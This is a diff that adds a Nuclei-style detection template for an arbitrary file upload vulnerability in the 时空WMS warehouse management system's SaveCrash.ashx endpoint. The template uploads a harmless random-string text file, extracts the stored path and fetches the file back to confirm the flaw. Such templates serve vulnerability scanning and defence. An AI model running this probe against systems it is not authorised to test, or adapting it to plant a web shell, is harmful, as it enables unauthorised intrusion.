@@ -1,0 +1,50 @@
+id: shikongWMS-SaveCrash-upload
+
+info:
+  name: 时空WMS-仓储精细化管理系统 SaveCrash.ashx 任意文件上传漏洞
+  author: shikongWMS-SaveCrash-upload
+  severity: high
+  tags: shikongWMS-SaveCrash-upload
+
+http:
+  - raw:
+      - |
+        POST /crash/SaveCrash.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="file"; filename="rtetce.txt"
+        Content-Type: text/plain
+        
+        {{randstr_1}}
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+
+      - |+
+        GET /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        part: body
+        name: path
+        regex:
+          - '"Msg_info":/([^"]*\.txt)}'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
